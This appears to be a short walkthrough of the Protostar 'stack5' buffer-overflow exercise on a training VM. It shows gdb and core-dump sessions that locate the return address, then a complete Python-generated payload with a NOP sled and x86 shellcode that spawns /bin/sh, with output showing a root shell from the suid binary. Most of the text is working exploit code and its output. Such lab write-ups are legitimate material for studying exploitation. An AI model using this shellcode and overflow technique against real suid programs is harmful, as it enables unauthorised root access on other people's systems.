http://www.exploit-db.com/exploits/13357/

http://www.mattandreko.com/2011/12/exploit-exercises-protostar-stack-5.html

Dump cores for suid programs
http://unix.stackexchange.com/questions/15531/how-come-no-core-dump-is-create-when-an-application-has-suid-set
http://www.linuxinsight.com/proc_sys_fs_suid_dumpable.html
http://www.novell.com/support/kb/doc.php?id=3054866

echo 2 >/proc/sys/fs/suid_dumpable
-----------------------

user@protostar:/opt/protostar/bin$ python -c 'print "A"*76 + "\xEF\xBE\xAD\xDE" + "C"*100' > /tmp/shell

user@protostar:/opt/protostar/bin$ gdb --quiet ./stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) run < /tmp/shell
Starting program: /opt/protostar/bin/stack5 < /tmp/shell

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
(gdb) x /10s $esp
0xbffff7d0:	 'C' <repeats 100 times>

------------------------------------------------------------------
| In gdb stack addresses aren't the same as in a live run !!!    |
------------------------------------------------------------------
So better we analyze core file:
(By default core file is not readable..)
user@protostar:/opt/protostar/bin$ gdb ./stack5 --core=/tmp/core.11.stack5.1455 
...
Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
Core was generated by `./stack5'.
Program terminated with signal 11, Segmentation fault.
#0  0xdeadbeef in ?? ()
(gdb) x/10s $esp
0xbffff800:	 'C' <repeats 100 times>
...

So we got the address to jump to - 0xbffff800, where the shellcode we'll be.
user@protostar:~$ python -c 'print "A"*76 + "\x00\xf8\xff\xbf" + "\x90"*10 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' > /tmp/input
user@protostar:~$ /opt/protostar/bin/stack5 < /tmp/input 
# whoami
root
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
#

If we wouldn't have access to the core file, a python brute-forcer would help: bf.py (attached!)
